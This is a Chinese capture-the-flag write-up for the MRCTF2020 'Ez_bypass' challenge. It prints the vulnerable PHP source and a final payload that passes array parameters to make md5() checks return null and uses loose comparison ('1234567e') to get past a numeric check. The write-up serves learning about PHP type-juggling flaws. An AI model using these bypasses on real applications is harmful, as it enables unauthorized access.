# [MRCTF2020]Ez_bypass

## 一、直接打开页面得到PHP源代码

```php
<?php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';

if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
```



## 二、审计后发现需要满足以下条件

1. 需要传入两个Get参数gg和id：`if(isset($_GET['gg']) && isset($_GET['id']))`

2. id和gg的md5值需要相等，并且id和gg不恒等：`if (md5($id) === md5($gg) && $id !== $gg)`
3. 需要传入一个POST参数password
4. password不能为数字：`if (!is_numeric($passwd))`
5. password等于1234567：`if($passwd==1234567)`



## 三、根据以上条件，构造payload

1. gg和id可以传入数组类型的数据，让他们的`md5()`值都为null
2. password可以使用PHP弱类型比较绕过



最终payload：

```bash
/?id[]=1&gg[]=2

passwd=1234567e
```

Get Flag!

![image-20211019191439550](https://i.loli.net/2021/10/19/orjvAN4Qi3ITyP6.png)
